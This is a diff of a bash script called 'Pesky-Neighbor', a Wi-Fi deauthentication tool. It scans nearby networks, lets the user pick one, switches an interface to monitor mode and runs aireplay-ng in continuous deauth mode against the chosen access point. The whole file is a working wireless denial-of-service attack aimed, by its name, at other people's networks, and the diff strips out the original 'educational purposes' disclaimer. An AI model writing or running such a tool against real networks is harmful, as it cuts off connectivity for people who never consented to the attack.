@@ -1,32 +1,39 @@
 #!/bin/bash
 clear
+
 echo "
 =============================================================
-Script: Pesky-Neighbor    | this is only for educational
-Description: Deauth tool  | purposes. YAKM0 is not 
-Author: YAKM0             | responsible for damages.
-Email: YAKM0@pm.me        | Drink all the beer, 
-Twitter: @Y4KM0           | hack all the things. -dualcore
+Script: Pesky-Neighbor
+Description: Deauth tool
+Author: YAKM0
+Email: YAKM0@pm.me
+Twitter: @Y4KM0
 =============================================================
 "
+
 mon='mon'
 sleep 5
 clear
 
+# List available Wi-Fi networks and save to input.txt
+nmcli dev wifi | awk '$2 != "--"' | awk '{print NR,$1,$2,$4}' | awk -F : '$2!="" && $3!=""' > input.txt
 
-nmcli dev wifi | awk '$2 != "--"' |awk '{print $1,$2,$4}' | awk -F : '$2!="" && $3!=""' | awk '{print NR,$1,$2,$3}' > input.txt
 echo "========================================================================================"
-nmcli dev wifi | awk '$2 != "--"' |awk '{print $1,$2,$4}' | awk -F : '$2!="" && $3!=""' | awk '{print NR,$1,$2,$3}'
+nmcli dev wifi | awk '$2 != "--"' | awk '{print NR,$1,$2,$4}' | awk -F : '$2!="" && $3!=""'
 echo "========================================================================================"
-echo "which network would you like to deauth? (type number on left)"
+
+# Select a network to deauthenticate
+echo "Which network would you like to deauth? (type number on the left)"
 read num
 head -n $num input.txt | tail -1 > input2.txt
-Bssid=$(cat input2.txt | awk '{print $2}')
-chan=$(cat input2.txt | awk '{print $4}')
-ssid=$(cat input2.txt | awk '{print $3}')
+Bssid=$(awk '{print $2}' input2.txt)
+chan=$(awk '{print $4}' input2.txt)
+ssid=$(awk '{print $3}' input2.txt)
+
+# Confirm network selection
 while true; do
-    read -p "You chose $ssid, is this correct? " yp
-    case $yp in
+    read -p "You chose $ssid, is this correct? " answer
+    case $answer in
         [Yy]* ) break;;
         [Nn]* ) exit;;
         * ) echo "Please answer yes or no.";;
@@ -35,21 +42,27 @@ done
 
 clear
 ifconfig
-echo "You must start an interface in managed mode, ex. wlan0. Type which interface you want to start in managed mode below:"
+
+# Start an interface in managed mode
+echo "You must start an interface in managed mode, ex. wlan0."
 read interface
 while true; do
-    read -p "You chose $interface, is this correct? " yn
-    case $yn in
+    read -p "You chose $interface, is this correct? " answer
+    case $answer in
         [Yy]* ) break;;
         [Nn]* ) exit;;
         * ) echo "Please answer yes or no.";;
     esac
 done
+
 sudo airmon-ng start $interface > /dev/null 2>&1
 clear
+
+# Perform deauthentication
 sudo timeout 2s airodump-ng -d $Bssid -c $chan $interface$mon > /dev/null 2>&1
 sudo aireplay-ng -0 0 -a $Bssid $interface$mon --ignore-negative-one
 sleep 3
+
 clear
 echo "Returning to managed mode"
 sleep 2
